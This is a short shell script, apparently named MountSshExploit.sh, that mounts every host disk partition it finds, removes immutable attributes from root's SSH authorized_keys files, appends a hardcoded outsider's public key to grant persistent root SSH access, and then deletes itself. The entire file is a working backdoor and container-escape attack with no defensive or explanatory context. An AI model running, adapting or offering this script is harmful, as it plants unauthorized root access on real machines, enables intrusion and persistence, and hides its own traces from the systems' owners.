

ID_RSA_KEY='ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDYmuFzpuEpN/KHPbQkSUT1Xe/gVl3FpIe/GlhJEnW84rCMsYhRe2xxcPc1xfZd10JBhM1kEhs5aycIYiPvLYTRi7mA88hE15OVCkwgPT2HgaY8oetbiNiu18jBygbnku2/avpf/Xl2vkcNJRwHjkik3/Vid9fSleNWeAI+RGrMRRiP4hXVBQjHbuSFlw2VDg0uZINodP+n8oWBDHGnMGei9W6OXxQ3R5C+oKBw9NA3K/drsqvJh81jbEkDXyqCG0Nj0sAUk6o/aGIIQpwxI3ez2Vi/lqm5LYsRO6ICsHP6RXJT/08XkUVNMu7BLnje2RCG/kSKjVqW8QePyajHJ64kHwYf1yeyGfObZJWhUSP3yPK6UtGxBouyA/TPTqvba4vAmUy1Jl7hyWkoa4KUwgmsEizmT9n8GEg1USPXxRWNqv0VIi5160tcoujrB85HYwjwIhbphCqhTKyNwnnFJNratI1hGurgr8t0fflC/igLph8PapiayTwTLEbNwSUwVp8D3rvBkYB+XV2wO4+q24IoNZJO6ePXEA80jAVEa7eGhlnV5BUIIG+pYP/CkukcggyW+vGRTrl07KrvhAn9dLGDg1J8KZM2hMx5L/2ulgjKTjPZI566fL6Y0dDhPJZH8bxAq6i/ciXXZFeuaG4eCDkitPdSzhFtyuZQj712h6NLow== hilde@parrot'

HOST_PATH=$(fdisk -l | grep '/dev/' | grep -v 'Disk ' | awk '{print $1}')
HOST_DRIV=$(fdisk -l | grep '/dev/' | grep -v 'Disk ' | awk '{print $1}' | sed 's/\/dev\///g')

if [ ! -z "$HOST_PATH" ]; then

mkdir -p /.host/

for HOSTPATH in ${HOST_PATH[@]}; do

HOST_DRV=$(echo $HOSTPATH | sed 's/\/dev\///g')
mkdir -p /.host/$HOST_DRV 2>/dev/null
mount $HOSTPATH /.host/$HOST_DRV

if [ -d /.host/$HOST_DRV/root/ ];then 
mkdir -p /.host/$HOST_DRV/root/.ssh/ 2>/dev/null
chattr -ia /.host/$HOST_DRV/root/.ssh/authorized_keys /.host/$HOST_DRV/root/.ssh/authorized_keys2 2>/dev/null
echo $ID_RSA_KEY >> /.host/$HOST_DRV/root/.ssh/authorized_keys
echo $ID_RSA_KEY >> /.host/$HOST_DRV/root/.ssh/authorized_keys2
fi

done

fi

rm -f /MountSshExploit.sh
rm -f MountSshExploit.sh
